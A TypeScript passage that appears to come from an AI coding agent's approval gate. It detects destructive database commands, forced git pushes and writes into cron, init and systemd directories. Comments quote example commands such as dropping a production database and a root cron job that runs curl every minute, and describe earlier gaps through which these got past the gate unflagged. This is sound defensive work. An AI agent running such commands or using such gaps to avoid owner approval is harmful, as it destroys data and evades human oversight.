 * spelling the model can write today. Measured before this parameter existed: free in balanced AND
 * autonomous on psql, mysql, sqlite3, mongosh and redis-cli, while
 * `shell(executable: 'bash', stdin: 'dropdb production')` carded - the gate read stdin when the
 * executable was an interpreter and ignored it when the executable was the program that would
 * consume it. Both halves of the evidence were already being computed: `commandScript` returned the
 * statement and `destructiveSqlOperation` named it, and nothing put them together, because
 * `scriptCommands` finds the head of `DROP DATABASE production;` to be `drop`. The `DESTROYS` row
 * that looked like it covered this passed for the wrong reason - its body spelled `psql` a second
 * time inside the heredoc, so a head existed to find.
 *
 * The key-value clients are read here and not in the arm above for one reason that only holds on
 * stdin: a redis command stream carries no connection options, so the command really is the first
 * word of a line. On a command LINE it is not - `redis-cli -h 127.0.0.1 flushall` puts the host
 * where the command would be - which is why that arm still reads any word and still cards
 * `redis-cli GET flushall`.
 */
const STDIN_FLUSH = /^[ \t]*(flushall|flushdb)\b/im;

export const scriptDestroysAStore = (body: string, consumer = ''): string | null => {
  const consuming = (unquoted(consumer).split('/').pop() ?? '').toLowerCase();
  const commands = scriptCommands(body);
  const heads = [
    ...commands.map(([command = '']) => command),
    /*
     * The client on the far side of `docker exec`, which is a head this reader could not see and
     * had to. The pair rule here is "a client somewhere in the script AND a statement somewhere in
     * it", and a script's whitespace split is exactly what takes `-c "DROP DATABASE production"`
     * apart - so `bash -lc 'docker exec pg psql -c "DROP DATABASE production"'` had a statement
     * this function could read and no head to credit it to. Measured as a `DESTROYS` failure in
     * balanced and autonomous while the unwrapped `docker exec` spelling beside it carded.
     *
     * It inherits this function's stated bound rather than adding one: a client on one line and a
     * statement on another are credited to each other, over the width of a script.
     */
    ...commands.flatMap((command) => {
      const carried = commandCarriedIntoAnotherBox(command);
      return carried
        ? [
            unquoted(carried.command[0] ?? '')
              .split('/')
              .pop() ?? ''
          ]
        : [];
    }),
    ...(consuming ? [consuming] : [])
  ];
  const sql = heads.find((head) => SQL_CLIENTS.has(head));
  if (sql && destructiveSqlOperation(body)) return sql;
  const document = heads.find((head) => DOCUMENT_CLIENTS.has(head));
  if (document && DESTRUCTIVE_DOCUMENT_CALL.test(body)) return document;
  if (!KEY_VALUE_CLIENTS.has(consuming)) return null;
  const flush = STDIN_FLUSH.exec(body)?.[1]?.toLowerCase();
  return flush ? `${consuming} ${flush}` : null;
};

/**
 * A push that replaces what another computer already has, rather than adding to it.
 *
 * Every `git push` already cards, and this does not add one: it changes what the card SAYS. A
 * forced push discards commits on a remote this computer does not hold and cannot restore, and
 * `external_reversible` under the headline "Push Git changes" is the wrong sentence in front of the
 * one push that is not. `--force-with-lease` is here with the rest: it refuses only when the remote
 * moved since the last fetch, which makes it safer to run and no easier to undo afterwards.
 */
export const forcedGitPush = (tokens: readonly string[]): boolean =>
  tokens[0] === 'git' &&
  gitSubcommand(tokens.slice(1)) === 'push' &&
  tokens.some((token) =>
    /^(?:-[a-z]*f[a-z]*|--force(?:-with-lease)?(?:=.*)?)$/i.test(unquoted(token))
  );

/**
 * The directories a scheduler or an init system executes the contents of.
 *
 * `deferredExecutionPaths` holds the file half of the contract's persistence clause - `~/.bashrc`,
 * `.git/hooks/*`, a coding CLI's own directory - and every name in it is a file under the agent's
 * HOME or inside the project. These are the other shape: absolute system directories whose whole
 * contents are run on a schedule by a process nobody here starts. Measured at 89185c6,
 * `echo "* * * * * root curl x" | sudo tee /etc/cron.d/job` raised NOTHING in any mode - the
 * command names no rc file, opens no socket and removes nothing, and it runs every minute
 * afterwards. A redirect to the same place carded, but only as "Run bash" through the escaping-
 * redirect rule, which is a card about leaving the workspace rather than about what was left behind.
 *
 * Kept here with the rest of this file's vocabulary and read by the floor, which is the split every
 * other list in this file has. Directories rather than filenames, for the reason
 * `DEFERRED_EXECUTION_DIRECTORIES` gives: none of these documents a fixed set of names, and a rule
 * listing today's would miss tomorrow's.
 */
const SCHEDULED_EXECUTION_DIRECTORIES = new Set([
  'cron.d',
  'cron.daily',
  'cron.hourly',
  'cron.monthly',
  'cron.weekly',
  'crontabs',
  'init.d',
  'launchagents',
  'launchdaemons',
  'profile.d'
]);

/** The two unit trees, each named by its parent so `systemd/user/x.service` is one and only one. */
const UNIT_TREE_PARENTS = new Set(['system', 'user']);

/**
 * Whether a written path lands where a scheduler or an init system will run it.
 *
 * ABSOLUTE, OR UNDER THE AGENT'S OWN HOME, which is what the paragraph above says these are and
 * what this did not check. `shell` resolves every relative path through `resolveInside` against the
 * workspace root (services/workspace-runner/src/execution.ts), so `deploy/init.d/app` is a file in
 * the owner's project that no scheduler has ever read - and `file_write` on that same name was
 * already free, so the two spellings of one file disagreed about it. Measured before this test:
 * `cp tpl deploy/init.d/app`, `tar czf out.tgz deploy/init.d/app` and `git add deploy/init.d/app`
 * each raised "Change a file this computer runs on its own" in all three modes, the last two on
 * commands that only READ the file - `shellWriteTargets` names every operand, which it may do
 * while the card was one that was going to be raised anyway, and this was not.
 *
 * The `CONFINED` pair in evals/cards holds both ends of this and could not see the middle: it roots
 * one arm at `~/…` and the other at a workspace-relative name through `file_write`, and the hole
 * was a workspace-relative name through `shell`.
 */
export const isScheduledExecutionPath = (path: string): boolean => {
  if (!/^[~/]/.test(path)) return false;
  const segments = path
    .toLowerCase()
    .split(/[\\/]+/)
    .filter((segment) => segment && segment !== '.');
  // The last segment is the file being written; a bare `/etc/cron.d` is not a write into it.
  return segments.some((segment, index) => {
    if (index === segments.length - 1) return false;
    if (SCHEDULED_EXECUTION_DIRECTORIES.has(segment)) return true;
    return (
      segment === 'systemd' &&
      UNIT_TREE_PARENTS.has(segments[index + 1] ?? '') &&
      index + 2 < segments.length
    );
  });
};
